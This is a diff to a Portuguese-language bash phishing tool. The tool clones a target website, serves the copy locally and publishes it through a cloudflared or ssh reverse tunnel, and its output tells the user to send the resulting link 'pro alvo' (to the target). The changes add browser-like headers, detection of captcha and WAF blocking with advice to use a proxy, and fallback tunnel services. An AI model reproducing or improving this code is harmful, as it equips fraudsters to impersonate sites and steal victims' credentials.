@@ -112,13 +112,28 @@ clone_site() {
     # 1. Baixar HTML
     echo -e "${YELLOW}[1/6] Baixando HTML...${NC}"
     sleep 3
-    $curl_cmd $curl_opts -H "$ua" -H "Accept: $accept" -H "Accept-Language: $lang" -H "Accept-Encoding: identity" -o "$SITE_DIR/index.html" "$target_url" > "$SCRIPT_DIR/curl.log" 2>&1
+    # Baixar HTML com headers reais e compressed
+    $curl_cmd $curl_opts --compressed -H "$ua" -H "Accept: $accept" -H "Accept-Language: $lang" -H "Accept-Encoding: gzip, deflate, br" -H "Cache-Control: no-cache" -H "Connection: keep-alive" -o "$SITE_DIR/index.html" "$target_url" > "$SCRIPT_DIR/curl.log" 2>&1
 
+    # Verificar se baixou e se é HTML válido (não página de erro/bloqueio)
     if [ ! -s "$SITE_DIR/index.html" ]; then
-        echo -e "${RED}[ERRO] Falha ao baixar${NC}"
+        echo -e "${RED}[ERRO] Falha ao baixar (arquivo vazio)${NC}"
         cat "$SCRIPT_DIR/curl.log" 2>/dev/null
         return 1
     fi
+
+    # Verificar charset e converter se necessário
+    local ct=$(file -bi "$SITE_DIR/index.html" 2>/dev/null | grep -oE 'charset=[^;]+' || echo "")
+    if ! echo "$ct" | grep -qi "utf-8"; then
+        iconv -f ISO-8859-1 -t UTF-8 "$SITE_DIR/index.html" 2>/dev/null > "$SITE_DIR/.tmp.html" && mv "$SITE_DIR/.tmp.html" "$SITE_DIR/index.html" 2>/dev/null
+    fi
+
+    # Detectar se retorna página de captcha/bloqueio comum
+    if grep -qiE 'cf-browser-verification|Just a moment|enable JavaScript|Verify you are human|Access denied|Forbidden|Your IP has been blocked' "$SITE_DIR/index.html" 2>/dev/null; then
+        echo -e "${YELLOW}  ⚠ Site bloqueou acesso (captcha/waf)${NC}"
+        echo -e "${YELLOW}  → Tente com proxy (opção 9)${NC}"
+    fi
+
     local html_size=$(wc -c < "$SITE_DIR/index.html")
     echo -e "${GREEN}  → ${html_size} bytes${NC}"
 
@@ -225,7 +240,7 @@ ENDSPA
         elif echo "$css_url" | grep -q "^/"; then css_abs="${base_domain}${css_url}"
         else css_abs="${base_domain}/${css_url}"
         fi
-        $curl_cmd $curl_opts -o "$SITE_DIR/$css_file" "$css_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
+        $curl_cmd $curl_opts -H "Accept: text/css,*/*;q=0.1" -H "Referer: $base_domain/" -o "$SITE_DIR/$css_file" "$css_abs" >> "$SCRIPT_DIR/curl.log" 2>&1
         perl -i -pe "s|\Q${css_url}\E|${css_file}|g" "$SITE_DIR/index.html"
         css_count=$((css_count + 1))
     done < "$css_list_file"
@@ -443,19 +458,46 @@ start_tunnel() {
     pkill -f cloudflared 2>/dev/null
     sleep 1
 
-    echo -e "${YELLOW}[...] Criando túnel (até 20s)...${NC}"
+    echo -e "${YELLOW}[...] Criando túnel...${NC}"
+
+    # Tentar cloudflared primeiro
+    local tunnel_url=""
+    local tunnel_erro=""
     cloudflared tunnel --url "http://localhost:8080" > "$TUNNEL_LOG" 2>&1 &
     local tunnel_pid=$!
     echo "$tunnel_pid" > "$SCRIPT_DIR/.tunnel.pid"
 
-    # Esperar até o link aparecer
-    local tunnel_url=""
     for i in 1 2 3 4 5 6 7 8 9 10; do
         sleep 2
         tunnel_url=$(grep -oE 'https://[a-zA-Z0-9.-]+\.trycloudflare\.com' "$TUNNEL_LOG" 2>/dev/null | head -1)
         [ -n "$tunnel_url" ] && break
+        # Detectar erro cloudflared (sem conta/rate limit)
+        grep -qi "Error unmarshaling\|rate limit\|1101\|forbidden" "$TUNNEL_LOG" 2>/dev/null && { tunnel_erro="cloudflare_bloqueado"; break; }
         echo -ne "\r  Tentando ${i}0s...${NC}"
     done
+
+    # Fallback: se cloudflared falhou, tentar bore.lt
+    if [ -z "$tunnel_url" ] && [ -n "$tunnel_erro" ]; then
+        echo -e "\n${YELLOW}  Cloudflare bloqueado. Tentando bore.lt...${NC}"
+        kill "$tunnel_pid" 2>/dev/null
+        rm -f "$SCRIPT_DIR/.tunnel.pid"
+        pkill -f cloudflared 2>/dev/null
+        sleep 1
+
+        ssh -o StrictHostKeyChecking=no -o ServerAliveInterval=15 -R 80:localhost:8080 bore_lt > "$TUNNEL_LOG" 2>&1 &
+        tunnel_pid=$!
+        echo "$tunnel_pid" > "$SCRIPT_DIR/.tunnel.pid"
+        sleep 5
+
+        for i in 1 2 3 4 5; do
+            sleep 3
+            tunnel_url=$(grep -oE '[a-zA-Z0-9.-]+\.(bore\.lt|serv\.ee|ngrok\.io|loca\.lt|bepro\.fun)' "$TUNNEL_LOG" 2>/dev/null | head -1)
+            # Fallback: bore retorna URL no formato "Forwarding to..."
+            [ -z "$tunnel_url" ] && tunnel_url=$(grep -oE 'https?://\S+' "$TUNNEL_LOG" 2>/dev/null | tail -1)
+            [ -n "$tunnel_url" ] && break
+            echo -ne "\r  Tentando bore (${i}0s)...${NC}"
+        done
+    fi
 
     echo ""
     if [ -n "$tunnel_url" ] && [ "$tunnel_url" != "" ]; then
@@ -467,10 +509,14 @@ start_tunnel() {
         echo -e "  ${YELLOW}💡 Mande esse link pro alvo!${NC}"
         echo "$tunnel_url" > "$SCRIPT_DIR/.tunnel_link"
     else
-        echo -e "${YELLOW}  Túnel criado, aguardando link...${NC}"
+        echo -e "${YELLOW}  ⚠ Túnel não disponível${NC}"
+        [ -n "$tunnel_erro" ] && echo -e "${RED}  Cloudflare: tunnel bloqueado (sem conta)${NC}"
         echo -e "${YELLOW}  Verifique: cat $TUNNEL_LOG${NC}"
-        echo "  Últimas linhas:"
-        tail -5 "$TUNNEL_LOG" 2>/dev/null
+        echo ""
+        echo -e "  ${SOLUÇÃO}:${NC}"
+        echo -e "  1) cloudflared tunnel login"
+        echo "  2) Ou use: ssh -R 80:localhost:8080 bore.lt"
+        echo "  3) Ou instale ngrok: pkg install ngrok"
     fi
 
     echo ""
@@ -483,6 +529,7 @@ start_tunnel() {
         [ -f "$SCRIPT_DIR/.tunnel.pid" ] && kill $(cat "$SCRIPT_DIR/.tunnel.pid") 2>/dev/null
         rm -f "$SCRIPT_DIR/.tunnel.pid"
         pkill -f cloudflared 2>/dev/null
+        pkill -f "ssh.*bore" 2>/dev/null
         echo -e "${GREEN}[OK]${NC}"
     fi
 }
